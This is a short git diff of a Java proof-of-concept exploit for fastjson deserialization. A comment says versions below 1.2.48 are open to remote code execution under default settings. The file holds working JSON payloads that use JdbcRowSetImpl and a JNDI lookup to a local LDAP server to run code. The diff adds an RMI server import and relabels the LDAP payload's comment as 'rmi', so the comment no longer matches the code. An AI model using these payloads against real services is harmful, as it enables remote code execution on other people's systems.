@@ -2,6 +2,7 @@ package com.threedr3am.bug.fastjson;
 
 import com.alibaba.fastjson.JSON;
 import com.threedr3am.bug.server.LdapServer;
+import com.threedr3am.bug.server.RmiServer;
 
 /**
  * fastjson 1.2.48以下不需要任何配置，默认配置通杀RCE
@@ -27,7 +28,7 @@ public class NoNeedAutoTypePoc {
     */
     String payload = "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}";
 //    String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:43657/Calc\",\"autoCommit\":true}";//rmi方式
-    String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:43658/Calc\",\"autoCommit\":true}";//ldap方式
+    String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:43658/Calc\",\"autoCommit\":true}";//rmi方式
     JSON.parse(payload);
     JSON.parse(payload2);
     //所以，该payload需要分两步进行
